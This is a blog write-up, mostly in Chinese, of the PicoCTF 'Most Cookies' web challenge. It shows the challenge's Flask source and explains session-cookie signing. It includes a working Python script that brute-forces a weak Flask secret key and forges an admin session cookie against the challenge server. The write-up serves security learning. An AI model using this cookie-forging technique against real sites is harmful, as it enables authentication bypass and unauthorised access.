<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  PicoCTF - Most Cookies
  #


  tags: PicoCTF CTF Web
  #


  Background
  #

Python Flask session 學習心得

在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。

  Source code
  #

:::spoiler Source Code
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn&#39;t appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - Most Cookies"><meta property="og:description" content='PicoCTF - Most Cookies # tags: PicoCTF CTF Web # Background # Python Flask session 學習心得
在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。
Source code # :::spoiler Source Code
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open("./flag").read().rstrip() title = "Most Cookies" cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"] app.secret_key = random.choice(cookie_names) @app.route("/") def main(): if session.get("very_auth"): check = session["very_auth"] if check == "blank": return render_template("index.html", title=title) else: return make_response(redirect("/display")) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/search", methods=["GET", "POST"]) def search(): if "name" in request.form and request.form["name"] in cookie_names: resp = make_response(redirect("/display")) session["very_auth"] = request.form["name"] return resp else: message = "That doesn&#39;t appear to be a valid cookie." category = "danger" flash(message, category) resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp @app.route("/reset") def reset(): resp = make_response(redirect("/")) session.pop("very_auth", None) return resp @app.route("/display", methods=["GET"]) def flag(): if session.get("very_auth"): check = session["very_auth"] if check == "admin": resp = make_response(render_template("flag.html", value=flag_value, title=title)) return resp flash("That is a cookie! Not very special though...", "success") return render_template("not-flag.html", title=title, cookie_name=session["very_auth"]) else: resp = make_response(redirect("/")) session["very_auth"] = "blank" return resp if __name__ == "__main__": app.run() :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>PicoCTF - Most Cookies | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/web/picoctf---most-cookies/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - Most Cookies</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---brute-force>Exploit - Brute Force</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---most-cookies>PicoCTF - Most Cookies
<a class=anchor href=#picoctf---most-cookies>#</a></h1><h6 id=tags-picoctf-ctf-web>tags: <code>PicoCTF</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-picoctf-ctf-web>#</a></h6><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://vocus.cc/article/634c1c7efd89780001237de9>Python Flask session 學習心得</a></p><blockquote><p>在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。</p></blockquote><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-python=" data-lang="python=">from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open(&#34;./flag&#34;).read().rstrip()
title = &#34;Most Cookies&#34;
cookie_names = [&#34;snickerdoodle&#34;, &#34;chocolate chip&#34;, &#34;oatmeal raisin&#34;, &#34;gingersnap&#34;, &#34;shortbread&#34;, &#34;peanut butter&#34;, &#34;whoopie pie&#34;, &#34;sugar&#34;, &#34;molasses&#34;, &#34;kiss&#34;, &#34;biscotti&#34;, &#34;butter&#34;, &#34;spritz&#34;, &#34;snowball&#34;, &#34;drop&#34;, &#34;thumbprint&#34;, &#34;pinwheel&#34;, &#34;wafer&#34;, &#34;macaroon&#34;, &#34;fortune&#34;, &#34;crinkle&#34;, &#34;icebox&#34;, &#34;gingerbread&#34;, &#34;tassie&#34;, &#34;lebkuchen&#34;, &#34;macaron&#34;, &#34;black and white&#34;, &#34;white chocolate macadamia&#34;]
app.secret_key = random.choice(cookie_names)

@app.route(&#34;/&#34;)
def main():
	if session.get(&#34;very_auth&#34;):
		check = session[&#34;very_auth&#34;]
		if check == &#34;blank&#34;:
			return render_template(&#34;index.html&#34;, title=title)
		else:
			return make_response(redirect(&#34;/display&#34;))
	else:
		resp = make_response(redirect(&#34;/&#34;))
		session[&#34;very_auth&#34;] = &#34;blank&#34;
		return resp

@app.route(&#34;/search&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def search():
	if &#34;name&#34; in request.form and request.form[&#34;name&#34;] in cookie_names:
		resp = make_response(redirect(&#34;/display&#34;))
		session[&#34;very_auth&#34;] = request.form[&#34;name&#34;]
		return resp
	else:
		message = &#34;That doesn&#39;t appear to be a valid cookie.&#34;
		category = &#34;danger&#34;
		flash(message, category)
		resp = make_response(redirect(&#34;/&#34;))
		session[&#34;very_auth&#34;] = &#34;blank&#34;
		return resp

@app.route(&#34;/reset&#34;)
def reset():
	resp = make_response(redirect(&#34;/&#34;))
	session.pop(&#34;very_auth&#34;, None)
	return resp

@app.route(&#34;/display&#34;, methods=[&#34;GET&#34;])
def flag():
	if session.get(&#34;very_auth&#34;):
		check = session[&#34;very_auth&#34;]
		if check == &#34;admin&#34;:
			resp = make_response(render_template(&#34;flag.html&#34;, value=flag_value, title=title))
			return resp
		flash(&#34;That is a cookie! Not very special though...&#34;, &#34;success&#34;)
		return render_template(&#34;not-flag.html&#34;, title=title, cookie_name=session[&#34;very_auth&#34;])
	else:
		resp = make_response(redirect(&#34;/&#34;))
		session[&#34;very_auth&#34;] = &#34;blank&#34;
		return resp

if __name__ == &#34;__main__&#34;:
	app.run()
</code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題看起來很簡單，我一開始也想說只要用Burp的intruder爆破name就好，不過看了一下sauce，發現他還有一個驗證機制，就是判斷cookie的value要是admin，但看了一下cookie的形式發現有點類似JWT的感覺<code>eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZJEZ8A.b5j77V6nA0V6dzYvM_hg3yYRgJc</code>(當然它不是JWT只是形式有點像)，尤其是這學期修了CNS，所以對JWT直覺有點難搞，果不其然，在sauce的第7行有設定<code>secret_key</code>當作session簽章的依據，然後在<code>/display</code>的地方進行驗證</p><ol><li><code>name</code>參數要有值且必須是<code>cookie_names</code> list的其中一種</li><li>session的<code>very_auth</code>的value一定要是admin</li><li>session的signature也要forge</li></ol><h2 id=exploit---brute-force>Exploit - Brute Force
<a class=anchor href=#exploit---brute-force>#</a></h2><pre tabindex=0><code class="language-python=" data-lang="python=">from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

cookie_names = [&#34;snickerdoodle&#34;, &#34;chocolate chip&#34;, &#34;oatmeal raisin&#34;, &#34;gingersnap&#34;, &#34;shortbread&#34;, &#34;peanut butter&#34;, &#34;whoopie pie&#34;, &#34;sugar&#34;, &#34;molasses&#34;, &#34;kiss&#34;, &#34;biscotti&#34;, &#34;butter&#34;, &#34;spritz&#34;, &#34;snowball&#34;, &#34;drop&#34;, &#34;thumbprint&#34;, &#34;pinwheel&#34;, &#34;wafer&#34;, &#34;macaroon&#34;, &#34;fortune&#34;, &#34;crinkle&#34;, &#34;icebox&#34;, &#34;gingerbread&#34;, &#34;tassie&#34;, &#34;lebkuchen&#34;, &#34;macaron&#34;, &#34;black and white&#34;, &#34;white chocolate macadamia&#34;]

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__==&#39;__main__&#39;:
	for name in cookie_names:
		session = {}
		session[&#34;very_auth&#34;] = &#34;admin&#34;
		cookie = encodeFlaskCookie(name, session)
		r = requests.get(&#34;http://mercury.picoctf.net:6259/display&#34;, cookies={&#34;session&#34;:cookie}, allow_redirects=False)
		if &#34;picoCTF&#34; in r.text:
			print(r.text)
			break
</code></pre><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://youtu.be/8DrqOFr_SV8>picoCTF 2021 Most Cookies</a>
<a href=https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe>manageFlaskSession.py source code</a>
<a href=https://medium.com/seaniap/python-web-flask-%e5%a6%82%e4%bd%95%e9%80%8f%e9%81%8eform%e5%8f%96%e5%be%97%e8%b3%87%e6%96%99-7a63ebf9ff1f>Python Web Flask — 如何透過Form取得資料</a>
<a href=https://www.maxlist.xyz/2019/06/29/flask-session/>[Flask教學] Flask Session 使用方法和介紹</a>
<a href=https://picoctf2021.haydenhousen.com/web-exploitation/most-cookies>Most Cookies - Write up 1</a>
<a href=https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Most%20Cookies/MostCookies.md>Most Cookies - Write up 2</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---brute-force>Exploit - Brute Force</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>